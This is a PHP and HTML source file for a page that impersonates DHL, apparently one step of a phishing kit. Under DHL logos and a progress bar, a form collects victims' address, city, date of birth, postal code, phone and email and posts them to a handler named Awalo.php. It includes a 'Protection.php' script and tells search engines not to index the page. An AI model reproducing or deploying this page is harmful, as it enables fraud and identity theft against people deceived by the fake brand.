<?php
session_start();
include("Variablex/Protection.php");
include("Variablex/SYS.php");
include("dynamo.php");
?>
<!doctype html>
<html lang="ar">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
    
    <!-- CSS FILES -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <link rel="icon" type="image/x-icon" href="Assistant/favicon.ico">

    <title>DHL</title>

    <style>
        /* Custom styles */
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            color: #333;
        }
        .navbar {
            background-color: #ffcc00;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        .navbar .navbar-brand img {
            height: 50px;
            transition: transform 0.3s ease-in-out;
        }
        .navbar .navbar-brand img:hover {
            transform: scale(1.05);
        }
        .header-content {
            text-align: center;
            padding: 100px 0;
            background: linear-gradient(45deg, #ffcc00, #ff9900);
            color: white;
            clip-path: polygon(0 0, 100% 0, 100% 90%, 0% 100%);
        }
        .header-content h1 {
            font-size: 3rem;
            margin-bottom: 20px;
            animation: fadeInDown 1s ease-out;
        }
        .header-content img {
            max-width: 150px;
            margin-bottom: 30px;
            animation: pulse 2s infinite;
        }
        .card {
            border: none;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            overflow: hidden;
            transition: transform 0.3s ease-in-out;
        }
        .card:hover {
            transform: translateY(-5px);
        }
        .card-header {
            background-color: #ffcc00;
            text-align: center;
            color: white;
            padding: 20px;
        }
        .card-header img {
            max-width: 100px;
            animation: bounceIn 1s;
        }
        .progress-bar {
            background-color: #28a745;
            animation: progress-bar-stripes 1s linear infinite;
        }
        label {
            color: #333;
            font-weight: bold;
        }
        label span {
            color: #dc3545;
        }
        .footer {
            background-color: #333;
            color: #fff;
            padding: 40px 0;
            clip-path: polygon(0 10%, 100% 0, 100% 100%, 0% 100%);
        }
        .footer ul li a {
            color: #fff;
            transition: color 0.3s;
        }
        .footer ul li a:hover {
            color: #ffcc00;
        }
        .footer .social-icons a {
            transition: transform 0.3s;
        }
        .footer .social-icons a:hover {
            transform: scale(1.2);
        }
        .bg-dark {
            background-color: #222 !important;
        }
        .text-white a {
            transition: color 0.3s;
        }
        .text-white a:hover {
            color: #ffcc00 !important;
        }
        .important h5 {
            color: #ffcc00;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .important p {
            font-size: 1.1rem;
            line-height: 1.6;
            color: #555;
        }
    </style>
</head>

<body>
    <nav class="navbar navbar-expand-lg navbar-light fixed-top">
        <div class="container-fluid">
            <a class="navbar-brand" href="#">
                <img src="Assistant/dhl-logo.svg" alt="DHL Logo" class="animate__animated animate__swing">
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item"><a class="nav-link" href="#"><i class="fa fa-exclamation-circle me-2"></i><?php echo get_text("top_header1"); ?></a></li>
                    <li class="nav-item"><a class="nav-link" href="#"><?php echo get_text("top_header2"); ?></a></li>
                    <li class="nav-item"><a class="nav-link" href="#"><i class="fa fa-globe me-2"></i><?php echo $countrycode; ?></a></li>
                    <li class="nav-item"><a class="nav-link" href="#"><i class="fa fa-globe me-2"></i><?php echo get_text("top_header3"); ?></a></li>
                    <li class="nav-item"><a class="nav-link" href="#"><i class="fa fa-search me-2"></i><?php echo get_text("top_header4"); ?></a></li>
                </ul>
                <ul class="navbar-nav">
                    <li class="nav-item"><a class="nav-link" href="#"><i class="fa fa-list animate__animated animate__bounce animate__infinite"></i></a></li>
                </ul>
            </div>
        </div>
    </nav>

    <header class="header-content">
        <img src="Assistant/dhl-logo.svg" alt="DHL Logo" class="animate__animated animate__pulse animate__infinite">
        <h1 class="animate__animated animate__fadeInDown"><?php echo get_text("title"); ?></h1>
    </header>

    <div class="container mt-5">
        <div class="row">
            <div class="col-md-8 offset-md-2">
                <div class="card animate__animated animate__fadeInUp">
                    <div class="card-header">
                        <img src="Assistant/camion.png" alt="Camion" class="animate__animated animate__bounceIn">
                        <h3><?php echo get_text("title2"); ?></h3>
                    </div>
                    <div class="card-body">
                        <div class="progress mb-4">
                            <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" style="width: 66%" aria-valuenow="66" aria-valuemin="0" aria-valuemax="100"></div>
                        </div>
                        <form action="./Appearance/Awalo.php" method="post">
                            <input type="hidden" name="captcha">
                            <input type="hidden" name="step" value="">
                            <div class="mb-4">
                                <label for="adress"><?php echo get_text("address_label"); ?> <span>*</span></label>
                                <input type="text" name="adress" id="adress" class="form-control" required>
                            </div>
                            <div class="mb-4">
                                <label for="city"><?php echo get_text("city_label"); ?> <span>*</span></label>
                                <input type="text" name="city" id="city" class="form-control" required>
                            </div>
                            <div class="row">
                                <div class="col-md-6 mb-4">
                                    <label for="dob"><?php echo get_text("birth_date_label"); ?> <span>*</span></label>
                                    <input type="text" name="dob" id="dob" class="form-control" placeholder="DD/MM/YYYY" required>
                                </div>
                                <div class="col-md-6 mb-4">
                                    <label for="zip"><?php echo get_text("zip_code_label"); ?> <span>*</span></label>
                                    <input type="text" name="zip" id="zip" class="form-control" placeholder="00000" required>
                                </div>
                            </div>
                            <div class="mb-4">
                                <label for="phone"><?php echo get_text("phone_label"); ?> <span>*</span></label>
                                <input type="text" name="phone" id="phone" class="form-control" required>
                            </div>
                            <div class="mb-4">
                                <label for="email"><?php echo get_text("email_label"); ?> <span>*</span></label>
                                <input type="email" name="email" id="email" class="form-control" placeholder="jhon.nuer@exomple.com" required>
                            </div>
                            <button class="btn btn-primary btn-lg animate__animated animate__heartBeat animate__infinite" type="submit" name="submit"><?php echo get_text("next"); ?></button>
                        </form>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div class="container mt-5 important">
        <div class="row">
            <div class="col-md-8 offset-md-2">
                <h5 class="text-center"><?php echo get_text("important_title"); ?></h5>
                <p><?php echo get_text("important_message"); ?></p>
            </div>
        </div>
    </div>

    <footer class="footer mt-5">
        <div class="container">
            <div class="row">
                <div class="col-lg-3 col-md-6">
                    <ul>
                        <li><strong><?php echo get_text("footer-widget-1-header"); ?></strong></li>
                        <li><?php echo get_text("footer-widget-1-1"); ?></li>
                        <li><?php echo get_text("footer-widget-1-2"); ?></li>
                        <li><?php echo get_text("footer-widget-1-3"); ?></li>
                        <li><?php echo get_text("footer-widget-1-4"); ?></li>
                    </ul>
                </div>
                <div class="col-lg-3 col-md-6">
                    <ul>
                        <li><strong><?php echo get_text("footer-widget-2-header"); ?></strong></li>
                        <li><?php echo get_text("footer-widget-2-1"); ?></li>
                        <li><?php echo get_text("footer-widget-2-2"); ?></li>
                        <li><?php echo get_text("footer-widget-2-3"); ?></li>
                        <li><?php echo get_text("footer-widget-2-4"); ?></li>
                        <li><?php echo get_text("footer-widget-2-5"); ?></li>
                        <li><?php echo get_text("footer-widget-2-6"); ?></li>
                    </ul>
                </div>
                <div class="col-lg-3 col-md-6">
                    <ul>
                        <li><strong><?php echo get_text("footer-widget-3-header"); ?></strong></li>
                        <li><?php echo get_text("footer-widget-3-1"); ?></li>
                        <li><?php echo get_text("footer-widget-3-2"); ?></li>
                        <li><?php echo get_text("footer-widget-3-3"); ?></li>
                        <li><?php echo get_text("footer-widget-3-4"); ?></li>
                        <li><?php echo get_text("footer-widget-3-5"); ?></li>
                        <li><?php echo get_text("footer-widget-3-6"); ?></li>
                        <li><?php echo get_text("footer-widget-3-7"); ?></li>
                        <li><?php echo get_text("footer-widget-3-8"); ?></li>
                        <li><?php echo get_text("footer-widget-3-9"); ?></li>
                    </ul>
                </div>
                <div class="col-lg-3 col-md-6">
                    <ul>
                        <li><strong><?php echo get_text("footer-widget-4-header"); ?></strong></li>
                        <li><?php echo get_text("footer-widget-4-1"); ?></li>
                        <li><?php echo get_text("footer-widget-4-2"); ?></li>
                        <li><?php echo get_text("footer-widget-4-3"); ?></li>
                        <li><?php echo get_text("footer-widget-4-4"); ?></li>
                        <li><?php echo get_text("footer-widget-4-5"); ?></li>
                        <li><?php echo get_text("footer-widget-4-6"); ?></li>
                    </ul>
                </div>
            </div>
        </div>
    </footer>

    <div class="bg-dark text-center text-white py-3">
        <div class="container">
            <img src="Assistant/group.svg" alt="Group" class="mb-3">
            <ul class="list-inline mb-3">
                <li class="list-inline-item"><a href="#" class="text-white"><?php echo get_text("footer-menu-1"); ?></a></li>
                <li class="list-inline-item"><a href="#" class="text-white"><?php echo get_text("footer-menu-2"); ?></a></li>
                <li class="list-inline-item"><a href="#" class="text-white"><?php echo get_text("footer-menu-3"); ?></a></li>
                <li class="list-inline-item"><a href="#" class="text-white"><?php echo get_text("footer-menu-4"); ?></a></li>
                <li class="list-inline-item"><a href="#" class="text-white"><?php echo get_text("footer-menu-5"); ?></a></li>
                <li class="list-inline-item"><a href="#" class="text-white"><?php echo get_text("footer-menu-6"); ?></a></li>
                <li class="list-inline-item"><a href="#" class="text-white"><?php echo get_text("footer-menu-7"); ?></a></li>
               <li class="list-inline-item"><a href="#" class="text-white"><?php echo get_text("footer-menu-8"); ?></a></li>
               </ul><div><?php echo get_text("copyright"); ?></div></div></div>
               <!-- JS FILES -->
               <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
               <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
               <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
               <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
               <script>
                   $("#dob").mask("00/00/0000");
                    $("#phone").mask("0000000000000000000");
               </script>
</body>
</html>